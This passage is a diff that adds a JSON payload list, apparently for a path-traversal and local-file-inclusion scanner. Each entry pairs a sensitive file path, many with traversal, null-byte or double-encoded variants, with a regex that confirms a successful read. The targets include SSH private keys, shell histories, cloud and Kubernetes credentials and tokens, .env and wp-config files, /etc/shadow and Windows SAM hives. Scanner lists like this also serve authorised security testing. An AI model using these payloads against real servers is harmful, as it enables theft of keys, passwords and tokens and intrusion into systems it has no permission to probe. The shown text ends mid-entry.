+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/home/azureuser/.ssh/id_rsa",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/home/devops/.ssh/id_ed25519",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "../../../../../../root/.ssh/id_rsa",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/root/.ssh/authorized_keys",
+    "matcher": "(ssh-rsa|ssh-ed25519|ecdsa-sha2)"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/home/admin/.ssh/authorized_keys",
+    "matcher": "(ssh-rsa|ssh-ed25519|ecdsa-sha2)"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/home/ubuntu/.ssh/authorized_keys",
+    "matcher": "(ssh-rsa|ssh-ed25519|ecdsa-sha2)"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/home/ec2-user/.ssh/authorized_keys",
+    "matcher": "(ssh-rsa|ssh-ed25519|ecdsa-sha2)"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/root/.ssh/known_hosts",
+    "matcher": "(ssh-rsa|ecdsa-sha2|ssh-ed25519)"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/etc/ssh/sshd_config",
+    "matcher": "(Port\\s+\\d+|PermitRootLogin|PasswordAuthentication)"
+  },
+  {
+    "category": "linux-ssh",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/etc/ssh/ssh_host_rsa_key",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/root/.bash_history",
+    "matcher": "(sudo|ssh|curl|wget|export|psql|mysql)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/home/admin/.bash_history",
+    "matcher": "(sudo|ssh|curl|wget)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/home/ubuntu/.bash_history",
+    "matcher": "(sudo|ssh|curl|wget)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/home/user/.bash_history",
+    "matcher": "(sudo|ssh|curl|wget)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/root/.zsh_history",
+    "matcher": "(sudo|ssh|curl|wget)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/root/.sh_history",
+    "matcher": "(sudo|ssh|curl)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/root/.mysql_history",
+    "matcher": "(SELECT|INSERT|GRANT|DROP)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/root/.psql_history",
+    "matcher": "(SELECT|INSERT|GRANT|DROP)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/root/.python_history",
+    "matcher": "(import|print|def\\s|=)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/root/.lesshst",
+    "matcher": "(\\.search|\\.shell)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/root/.viminfo",
+    "matcher": "(# Registers|# History|jumplist)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/root/.gitconfig",
+    "matcher": "(\\[user\\]|email\\s*=|name\\s*=)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "/root/.netrc",
+    "matcher": "(machine|login|password)"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "/root/.aws/credentials",
+    "matcher": "aws_access_key_id"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "/root/.docker/config.json",
+    "matcher": "(auths|auth\\\")"
+  },
+  {
+    "category": "linux-history",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "/root/.kube/config",
+    "matcher": "(apiVersion|clusters|client-certificate-data)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "/proc/self/environ",
+    "matcher": "(HTTP_|PATH=|HOSTNAME=)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "../../../../../../proc/self/environ",
+    "matcher": "(HTTP_|PATH=|HOSTNAME=)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/proc/self/cmdline",
+    "matcher": "(/usr/|/bin/|--port|--config)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/proc/self/status",
+    "matcher": "(Name:|Pid:|Uid:|VmSize:)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/proc/self/stat",
+    "matcher": "\\d+\\s+\\([^)]+\\)\\s+[RSDZTX]"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/proc/self/maps",
+    "matcher": "[0-9a-f]+-[0-9a-f]+\\s+[rwxp]"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/proc/self/fd/0",
+    "matcher": ".+"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/proc/self/mounts",
+    "matcher": "(/dev/|tmpfs|rw,)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/proc/self/cwd/config.php",
+    "matcher": "<\\?php"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/proc/version",
+    "matcher": "(Linux version|gcc)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/proc/cmdline",
+    "matcher": "(BOOT_IMAGE|root=|ro\\s|quiet)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/proc/mounts",
+    "matcher": "(/dev/|tmpfs|rw,)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/proc/net/tcp",
+    "matcher": "(sl\\s+local_address|[0-9A-F]{8}:[0-9A-F]{4})"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.7",
+    "payload": "/proc/net/fib_trie",
+    "matcher": "(\\|--|/24|/32)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.7",
+    "payload": "/proc/net/arp",
+    "matcher": "(IP address|HW address|0x)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.7",
+    "payload": "/proc/cpuinfo",
+    "matcher": "(processor|cpu MHz|model name)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.7",
+    "payload": "/proc/meminfo",
+    "matcher": "(MemTotal:|MemFree:)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/proc/1/cmdline",
+    "matcher": "(/sbin/init|/usr/lib/systemd|/init)"
+  },
+  {
+    "category": "proc-self",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/proc/1/environ",
+    "matcher": "(PATH=|HOME=|container=)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/var/log/auth.log",
+    "matcher": "(sshd|Accepted|Failed)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/var/log/secure",
+    "matcher": "(sshd|Accepted|Failed)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/var/log/syslog",
+    "matcher": "([A-Z][a-z]{2}\\s+\\d+\\s+\\d+:\\d+:\\d+|kernel:)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/var/log/messages",
+    "matcher": "([A-Z][a-z]{2}\\s+\\d+\\s+\\d+:\\d+:\\d+|kernel:)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/var/log/dpkg.log",
+    "matcher": "(install|configure|status)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/var/log/apt/history.log",
+    "matcher": "(Start-Date|Install|Commandline)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.7",
+    "payload": "/var/log/faillog",
+    "matcher": ".+"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.7",
+    "payload": "/var/log/lastlog",
+    "matcher": ".+"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "low",
+    "cvss": "3.7",
+    "payload": "/var/log/wtmp",
+    "matcher": ".+"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/var/log/apache2/access.log",
+    "matcher": "(HTTP/1\\.[01]|GET\\s|POST\\s)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/var/log/apache2/error.log",
+    "matcher": "(\\[error\\]|\\[Wed|\\[Mon|\\[Sun|\\[Tue|\\[Thu|\\[Fri|\\[Sat)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/var/log/nginx/access.log",
+    "matcher": "(HTTP/1\\.[01]|GET\\s|POST\\s)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/var/log/nginx/error.log",
+    "matcher": "(\\[error\\]|\\[crit\\])"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/var/log/httpd/access_log",
+    "matcher": "(HTTP/1\\.[01]|GET\\s|POST\\s)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/var/log/httpd/error_log",
+    "matcher": "(\\[error\\]|\\[crit\\])"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/var/log/vsftpd.log",
+    "matcher": "(CONNECT|FTP|LOGIN)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/var/log/mail.log",
+    "matcher": "(postfix|sendmail|smtp)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/var/log/mysql/error.log",
+    "matcher": "(\\[ERROR\\]|mysqld|InnoDB)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/var/log/cron",
+    "matcher": "(CRON|CMD|RELOAD)"
+  },
+  {
+    "category": "var-log",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "../../../../../../var/log/auth.log",
+    "matcher": "(sshd|Accepted|Failed)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/nginx/nginx.conf",
+    "matcher": "(server\\s*\\{|http\\s*\\{|worker_processes)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/nginx/sites-enabled/default",
+    "matcher": "(server\\s*\\{|server_name)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/nginx/conf.d/default.conf",
+    "matcher": "(server\\s*\\{|listen\\s+\\d+)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/apache2/apache2.conf",
+    "matcher": "(ServerRoot|DocumentRoot|LoadModule)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/apache2/sites-enabled/000-default.conf",
+    "matcher": "(VirtualHost|DocumentRoot|ServerName)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/httpd/conf/httpd.conf",
+    "matcher": "(ServerRoot|DocumentRoot|LoadModule)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/php/8.2/apache2/php.ini",
+    "matcher": "(\\[PHP\\]|memory_limit|allow_url_fopen)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/php/8.1/fpm/php.ini",
+    "matcher": "(\\[PHP\\]|memory_limit)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/php/7.4/cli/php.ini",
+    "matcher": "(\\[PHP\\]|memory_limit)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/php.ini",
+    "matcher": "(\\[PHP\\]|memory_limit|allow_url_fopen)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/mysql/my.cnf",
+    "matcher": "(\\[mysqld\\]|\\[client\\]|datadir)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/mysql/mariadb.conf.d/50-server.cnf",
+    "matcher": "(\\[mysqld\\]|datadir|bind-address)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/postgresql/14/main/postgresql.conf",
+    "matcher": "(listen_addresses|max_connections|data_directory)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/postgresql/14/main/pg_hba.conf",
+    "matcher": "(local|host|trust|md5|scram-sha-256)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/redis/redis.conf",
+    "matcher": "(bind\\s+\\d+\\.|protected-mode|requirepass)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/mongod.conf",
+    "matcher": "(systemLog|storage|net:|bindIp)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/crontab",
+    "matcher": "(SHELL=|PATH=|\\*\\s+\\*|run-parts)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/sudoers",
+    "matcher": "(root\\s+ALL|%sudo|Defaults)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/group",
+    "matcher": "(root:x:0:|sudo:|docker:)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/exports",
+    "matcher": "(/\\S+\\s+\\S+\\(rw|no_root_squash)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/samba/smb.conf",
+    "matcher": "(\\[global\\]|workgroup|\\[homes\\])"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/supervisor/supervisord.conf",
+    "matcher": "(\\[supervisord\\]|\\[program:)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/environment",
+    "matcher": "(PATH=|LANG=|=)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/ld.so.conf",
+    "matcher": "(/usr/lib|/lib|include)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "/etc/shadow-",
+    "matcher": "root:\\$\\d+\\$"
+  },
+  {
+    "category": "cloud-meta",
+    "target_os": "any",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/.dockerenv",
+    "matcher": "."
+  },
+  {
+    "category": "cloud-meta",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/run/.containerenv",
+    "matcher": "."
+  },
+  {
+    "category": "cloud-meta",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/proc/1/cgroup",
+    "matcher": "(docker|kubepods|cri-)"
+  },
+  {
+    "category": "cloud-meta",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/proc/self/cgroup",
+    "matcher": "(docker|kubepods|cri-)"
+  },
+  {
+    "category": "cloud-meta",
+    "target_os": "any",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/run/secrets/kubernetes.io/serviceaccount/token",
+    "matcher": "ey[A-Za-z0-9_-]+\\.ey[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
+  },
+  {
+    "category": "cloud-meta",
+    "target_os": "any",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/var/run/secrets/kubernetes.io/serviceaccount/token",
+    "matcher": "ey[A-Za-z0-9_-]+\\.ey[A-Za-z0-9_-]+"
+  },
+  {
+    "category": "cloud-meta",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
+    "matcher": "[a-z0-9-]+"
+  },
+  {
+    "category": "cloud-meta",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
+    "matcher": "-----BEGIN CERTIFICATE-----"
+  },
+  {
+    "category": "cloud-meta",
+    "target_os": "any",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "/run/secrets/",
+    "matcher": ".+"
+  },
+  {
+    "category": "cloud-meta",
+    "target_os": "any",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "/var/run/secrets/eks.amazonaws.com/serviceaccount/token",
+    "matcher": "ey[A-Za-z0-9_-]+\\.ey"
+  },
+  {
+    "category": "cloud-meta",
+    "target_os": "any",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "file:///proc/self/environ",
+    "matcher": "(AWS_|KUBERNETES_|PATH=)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "/var/www/html/.env",
+    "matcher": "(APP_KEY|DB_PASSWORD|SECRET|API_KEY)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "/var/www/.env",
+    "matcher": "(APP_KEY|DB_PASSWORD|SECRET)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "../.env",
+    "matcher": "(APP_KEY|DB_PASSWORD|SECRET)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "../../.env",
+    "matcher": "(APP_KEY|DB_PASSWORD|SECRET)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "/app/.env",
+    "matcher": "(APP_KEY|DB_PASSWORD|SECRET)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "/var/www/html/wp-config.php",
+    "matcher": "(DB_PASSWORD|DB_USER|AUTH_KEY|<\\?php)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "/var/www/html/config.php",
+    "matcher": "(<\\?php|password|DB_)"
+  },
+  {
+    "category": "config",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "/var/www/html/configuration.php",
+    "matcher": "(<\\?php|public \\$password)"
+  },
+  {
+    "category": "windows-ini",
+    "target_os": "windows",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "C:\\Windows\\win.ini",
+    "matcher": "(\\[fonts\\]|\\[extensions\\]|for 16-bit app support)"
+  },
+  {
+    "category": "windows-ini",
+    "target_os": "windows",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "C:/Windows/win.ini",
+    "matcher": "(\\[fonts\\]|\\[extensions\\])"
+  },
+  {
+    "category": "windows-ini",
+    "target_os": "windows",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "../../../../../../Windows/win.ini",
+    "matcher": "(\\[fonts\\]|\\[extensions\\])"
+  },
+  {
+    "category": "windows-ini",
+    "target_os": "windows",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "..\\..\\..\\Windows\\win.ini",
+    "matcher": "\\[fonts\\]"
+  },
+  {
+    "category": "windows-ini",
+    "target_os": "windows",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "..%5c..%5c..%5cWindows%5cwin.ini",
+    "matcher": "\\[fonts\\]"
+  },
+  {
+    "category": "windows-ini",
+    "target_os": "windows",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "C:/Windows/system.ini",
+    "matcher": "\\[386Enh\\]"
+  },
+  {
+    "category": "windows-ini",
+    "target_os": "windows",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "../../../../../../boot.ini",
+    "matcher": "\\[boot loader\\]"
+  },
+  {
+    "category": "windows-ini",
+    "target_os": "windows",
+    "severity": "medium",
+    "cvss": "5.3",
+    "payload": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "matcher": "(127\\.0\\.0\\.1|localhost|::1)"
+  },
+  {
+    "category": "windows-ini",
+    "target_os": "windows",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "C:\\inetpub\\wwwroot\\web.config",
+    "matcher": "(<configuration>|<connectionStrings>|<appSettings>)"
+  },
+  {
+    "category": "windows-ini",
+    "target_os": "windows",
+    "severity": "low",
+    "cvss": "3.7",
+    "payload": "C:\\Windows\\debug\\NetSetup.log",
+    "matcher": "(NetpDo|NetpJoin)"
+  },
+  {
+    "category": "windows-ini",
+    "target_os": "windows",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "C:\\Windows\\Panther\\Unattend.xml",
+    "matcher": "(<UserAccounts>|<Password>)"
+  },
+  {
+    "category": "windows-sam",
+    "target_os": "windows",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "C:\\Windows\\System32\\config\\SAM",
+    "matcher": ".*"
+  },
+  {
+    "category": "windows-sam",
+    "target_os": "windows",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "C:\\Windows\\repair\\SAM",
+    "matcher": ".*"
+  },
+  {
+    "category": "windows-sam",
+    "target_os": "windows",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "C:\\Windows\\System32\\config\\SYSTEM",
+    "matcher": ".*"
+  },
+  {
+    "category": "windows-sam",
+    "target_os": "windows",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "C:\\Windows\\System32\\config\\SECURITY",
+    "matcher": ".*"
+  },
+  {
+    "category": "windows-sam",
+    "target_os": "windows",
+    "severity": "critical",
+    "cvss": "9.8",
+    "payload": "C:\\Windows\\repair\\system",
+    "matcher": ".*"
+  },
+  {
+    "category": "null-byte",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/passwd%00",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "null-byte",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/passwd%00.jpg",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "null-byte",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "../../../../../../etc/passwd%00.png",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "null-byte",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/passwd\\x00.html",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "null-byte",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "../../../etc/passwd%00.pdf",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "null-byte",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/etc/shadow%00.jpg",
+    "matcher": "root:\\$\\d+\\$"
+  },
+  {
+    "category": "null-byte",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "C:\\Windows\\win.ini%00.jpg",
+    "matcher": "\\[fonts\\]"
+  },
+  {
+    "category": "double-encoded",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "..%252f..%252f..%252fetc%252fpasswd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "double-encoded",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "double-encoded",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "..%c0%af..%c0%af..%c0%afetc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "double-encoded",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "..%25c0%25af..%25c0%25afetc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "double-encoded",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "double-encoded",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "..%255c..%255c..%255cWindows%255cwin.ini",
+    "matcher": "\\[fonts\\]"
+  },
+  {
+    "category": "double-encoded",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "%252e%252e%255c%252e%252e%255cetc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "encoded-bypass",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "encoded-bypass",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "encoded-bypass",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "encoded-bypass",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "..%5c..%5c..%5cetc%5cpasswd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
